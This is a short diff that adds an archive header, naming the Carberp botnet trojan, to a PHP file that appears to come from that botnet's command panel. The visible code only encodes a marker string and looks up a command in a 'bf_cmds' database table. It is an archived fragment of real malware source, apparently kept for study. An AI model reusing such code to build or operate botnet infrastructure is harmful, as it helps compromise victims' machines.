@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 
 $cebn = base64_encode('CHECKERRORSBOTNET');
 $result = $mysqli->query('SELECT cmd FROM bf_cmds WHERE (dev = \'1\') AND (cmd = \''.$cebn.'\') LIMIT 1');
